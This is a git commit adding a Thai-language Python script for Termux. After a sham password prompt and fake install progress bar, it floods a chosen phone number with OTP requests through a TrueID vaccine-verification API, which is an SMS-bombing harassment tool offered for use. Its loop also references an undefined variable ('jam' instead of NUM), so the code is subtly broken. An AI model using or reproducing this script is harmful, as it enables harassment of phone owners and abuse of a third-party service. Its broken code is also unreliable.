f8a4f742fc73137a8cfc66c2ad54893fe1395d59
ErroHacker <102239807+ErroHacker@users.noreply.github.com>
2022-04-10 18:08:02 +0700

    Add files via upload

---
+++ st.py
@@ -0,0 +1,94 @@
+import requests,json
+import os
+import time
+import threading
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+os.system('clear')
+os.system('termux-open-url https://youtube.com/channel/UC_xTHXQnVZmV119RCzcCxDg')
+print("") 
+print("""\033[1;96m
+
+█░░ █▀█ █▀▀ █ █▄░█
+█▄▄ █▄█ █▄█ █ █░▀█""") 
+print ("")
+name = input("\033[1;94mname : \033[95m")
+time.sleep(1) 
+print("") 
+password = input("\033[1;94mpass : \033[95m​") 
+time.sleep(1)
+print("") 
+password = int(input("\033[1;94mรหัสเข้าใช้งาน : \033[1;96m")) 
+time.sleep(1) 
+
+if password>=191:
+	print ("")
+	print("\033[92mรหัสถูก") 
+	time.sleep(1)
+	os.system("clear")
+
+else:
+    print("\033[91m รหัสผิด")
+    print ("")
+    time.sleep(5)
+    os.system("clear")
+    
+    
+print("กำลังติดตั้ง")
+print ("■■■10%")
+time.sleep(2) 
+print ("■■■■■■25%")
+time.sleep(3) 
+print("■■■■■■■■■50%")
+time.sleep(1) 
+print("■■■■■■■■■■■■75%")
+time.sleep(3) 
+print ("■■■■■■■■■■■■■■■85%")
+time.sleep(3) 
+print("■■■■■■■■■■■■■■■■■■100%")
+    
+    
+time.sleep(5)
+    
+    
+    
+    
+    
+    
+    
+import requests,json
+import random
+import os
+import time
+import threading
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+import colorama
+os.system('clear')
+print ("") 
+print("เครดิต[GM]​ GameMods")
+print("ผู้เขียนไฟล์ท่าน กัส")
+print("1api")
+print ("") #ท่าไม่ได้ใส่ข้อความคือเว้นวัค
+phone = input("𝚙𝚑𝚘𝚗𝚎 : ") #นี้คือ ใส่เบอร์
+print("")
+NUM= int(input("𝙽𝚞𝚖 : ")) #นี้คือจำนวน 
+
+print ("") #ท่าไม่ได้ใส่ข้อความคือเว้นวัค
+
+print ("")
+def api1(): #นี้คือapiที่1
+     requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+     print (f"\033[91mยิง{phone}แล้ว") #เวลายิงมันจะเเสดงข้อความ
+     
+for i in range(jam): #ค่าjam
+    time.sleep(1) #สปีด
+    threading.Thread(target=api1).start() #นี้คือ รันapiที่1น้าคร้าบบ
+    #จบแล้ว ครับ
+    
+    
+    
